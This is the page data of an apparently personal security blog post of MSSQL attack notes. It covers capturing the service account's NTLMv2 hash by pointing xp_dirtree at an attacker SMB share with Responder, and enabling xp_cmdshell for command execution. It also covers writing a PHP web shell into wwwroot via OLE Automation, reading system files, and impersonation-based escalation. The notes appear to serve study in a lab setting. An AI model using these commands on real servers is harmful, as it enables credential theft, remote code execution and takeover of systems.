{"componentChunkName":"component---src-templates-post-template-tsx","path":"/230405/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h1>Abusing MSSQL</h1>\n<aside>\r\nðŸ’¡ 4/8 of Basic Network Services\n</aside>\n<h2>1. Connecting, Interacting with MSSQL</h2>\n<p>CLI Commands:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">sqlcmd <span class=\"token parameter variable\">-S</span> SRVMSSQL <span class=\"token parameter variable\">-U</span> julio <span class=\"token parameter variable\">-P</span> <span class=\"token string\">'MyPassword!'</span> <span class=\"token parameter variable\">-y</span> <span class=\"token number\">30</span> <span class=\"token parameter variable\">-Y</span> <span class=\"token number\">30</span> <span class=\"token builtin class-name\">:</span> windows\r\nsqsh <span class=\"token parameter variable\">-S</span> <span class=\"token number\">10.129</span>.203.7 <span class=\"token parameter variable\">-U</span> julio <span class=\"token parameter variable\">-P</span> <span class=\"token string\">'MyPassword!'</span> <span class=\"token parameter variable\">-h</span> <span class=\"token builtin class-name\">:</span> linux\r\nsqsh <span class=\"token parameter variable\">-S</span> <span class=\"token number\">10.129</span>.203.7 <span class=\"token parameter variable\">-U</span> .<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>julio <span class=\"token parameter variable\">-P</span> <span class=\"token string\">'MyPassword!'</span> <span class=\"token parameter variable\">-h</span> <span class=\"token builtin class-name\">:</span> when we want to use <span class=\"token builtin class-name\">local</span> account\r\nmssqlclient.py <span class=\"token parameter variable\">-p</span> <span class=\"token number\">1433</span> julio@10.129.203.7 <span class=\"token builtin class-name\">:</span> linux</code></pre></div>\n<h2>2. MSSQL Hash extracting</h2>\n<ul>\n<li>What is MSSQL Hash?</li>\n</ul>\n<p>MSSQL service account hash usingÂ <code class=\"language-text\">xp_subdirs</code>orÂ <code class=\"language-text\">xp_dirtree</code>\r\nundocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.</p>\n<p>When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p>\n<ul>\n<li>Privilege Escalation or we can also check for password reuse.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> responder <span class=\"token parameter variable\">-I</span> tun0 <span class=\"token builtin class-name\">:</span> on our attack <span class=\"token function\">host</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span> EXEC master<span class=\"token punctuation\">..</span>xp_dirtree <span class=\"token string\">'\\\\10.10.110.17\\share\\'</span>\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span> GO\r\n\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span> EXEC master<span class=\"token punctuation\">..</span>xp_subdirs <span class=\"token string\">'\\\\10.10.110.17\\share\\'</span>\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span> GO</code></pre></div>\n<h2>3. File R/W and code execution</h2>\n<ul>\n<li>xp_cmdshell</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">EXECUTE sp_configure 'show advanced options', 1\r\nGO\r\nRECONFIGURE\r\nGO\r\nEXECUTE sp_configure 'xp_cmdshell', 1\r\nGO\r\nRECONFIGURE\r\nGO</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">\r\nxp_cmdshell <span class=\"token string\">'whoami'</span></code></pre></div>\n<ul>\n<li>File R/W</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">sp_configure <span class=\"token string\">'show advanced options'</span>, <span class=\"token number\">1</span>\r\nGO\r\nRECONFIGURE\r\nGO\r\nsp_configure <span class=\"token string\">'Ole Automation Procedures'</span>, <span class=\"token number\">1</span>\r\nGO\r\nRECONFIGURE\r\nGO</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span> DECLARE @OLE INT\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span> DECLARE @FileID INT\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">3</span>></span> EXECUTE sp_OACreate <span class=\"token string\">'Scripting.FileSystemObject'</span>, @OLE OUT\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">4</span>></span> EXECUTE sp_OAMethod @OLE, <span class=\"token string\">'OpenTextFile'</span>, @FileID OUT, <span class=\"token string\">'c:\\inetpub\\wwwroot\\webshell.php'</span>, <span class=\"token number\">8</span>, <span class=\"token number\">1</span>\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">5</span>></span> EXECUTE sp_OAMethod @FileID, <span class=\"token string\">'WriteLine'</span>, Null, <span class=\"token string\">'&lt;?php echo shell_exec($_GET[\"c\"]);?>'</span>\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">6</span>></span> EXECUTE sp_OADestroy @FileID\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">7</span>></span> EXECUTE sp_OADestroy @OLE\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">8</span>></span> GO\r\n\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span> SELECT * FROM OPENROWSET<span class=\"token punctuation\">(</span>BULK N<span class=\"token string\">'C:/Windows/System32/drivers/etc/hosts'</span>, SINGLE_CLOB<span class=\"token punctuation\">)</span> AS Contents\r\n<span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span> GO</code></pre></div>\n<h2>4. Impersonation and code execution</h2>\n<ul>\n<li>Impersonation</li>\n</ul>\n<p>Impersonation can be used to allow users who do not have permission to perform certain operations to execute those operations indirectly through a stored procedure or a user-defined function.</p>\n<ul>\n<li>Impersonation + Linked Server + Code Execution</li>\n</ul>\n<ol>\n<li>Check for the possibility of Impersonation</li>\n<li>Check if an impersonable user has higher permission on particular server</li>\n<li>Check if xp_cmd is enabled</li>\n<li>Check if xp_cmd can be enabled</li>\n<li>Check if we can execute commands</li>\n</ol>\n<h2>Source</h2>\n<ul>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"Abusing & Enumerating Basic MSSQL","summary":"Enumerating & Abusing MSSQL Service","date":"2023.04.05.","before":"2023.04.01.","after":"2023.04.05.","categories":["C-SEC","ENG","Network"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAACYklEQVQozz2RW08TURSF+5d89Seorz6Z+MKDwReMeIGg4KVeggImKKKpqdFKqKBBQrCI4Q4tDkOhpEAvQSi0086005nO5UznnLO3mRZcj/vk2+usvXzYEACYpmXbBM/EGTNNk1KKiJZFjhUtVzYY53JFk5RiLLFCHOIDAERUq7W2x1MvPywiAufeJBbPtj6anV7YQcRFMTm6FI9sbR8W5M6OrntPOge+90hKwQcNH5s4gdDE1OxKjaFNOSLmjqXBwHhyP4uIc+Luq9GZTz8XNpKZwEBfMBBQiQYAnnPTvCnCwGKAgBpFycUKBZsBozRfqekOz6RSXff9b14PH+4mbNPwefEA37/wi9FlRHQooxzSOp04JKLiLkpk5oS4gBUXKKJcVoTYampb2BfXNLXikyRpXRD6OlvnJ8OISBm3GSRUN6N7p2KcR0uOzUCxmU2BAkoV7SBXULUaIvrEDWHsx8S7a1fH71w3EMuEMQ7LRefbXztvsXXZCaatEmGqw02X2xxbbtw9f/nSrQcPPXgnvtndcXugrWU+NNTsDBGPDBrJ2Qc6TVbdeNn15mdPN7t7zl242Nb91IMppXWnbjn1A0neKyhVh+ku1DkwRArgMC+qA2BQUAiXTRr+fRSOpExDA8DTnktq5W0oND23nCuWELGqm6uJQr6oWYDDYaE/uFbVjd3NvLiQ7h1KBCOyd2YOp3Cd0ueBkf6PY1XTQkRhK3ulfXRkMoaIw19++Qe/GhZJirmVWLb9WbR3JHMK/89ZlJWSXG62bVl29M+G1PgFpXVCvI17J87nJSU4J0fTtQaF/wCvVnNGy7b8PAAAAABJRU5ErkJggg=="},"images":{"fallback":{"src":"/static/1163d3440619179f82a599e2bc44148e/8db65/5.png","srcSet":"/static/1163d3440619179f82a599e2bc44148e/a36a7/5.png 72w,\n/static/1163d3440619179f82a599e2bc44148e/8c4fd/5.png 143w,\n/static/1163d3440619179f82a599e2bc44148e/8db65/5.png 286w","sizes":"(min-width: 286px) 286px, 100vw"},"sources":[{"srcSet":"/static/1163d3440619179f82a599e2bc44148e/6f3ab/5.webp 72w,\n/static/1163d3440619179f82a599e2bc44148e/6081d/5.webp 143w,\n/static/1163d3440619179f82a599e2bc44148e/98123/5.webp 286w","type":"image/webp","sizes":"(min-width: 286px) 286px, 100vw"}]},"width":286,"height":176}},"publicURL":"/static/1163d3440619179f82a599e2bc44148e/5.png"}}}}]}},"pageContext":{"slug":"/230405/"}},"staticQueryHashes":[]}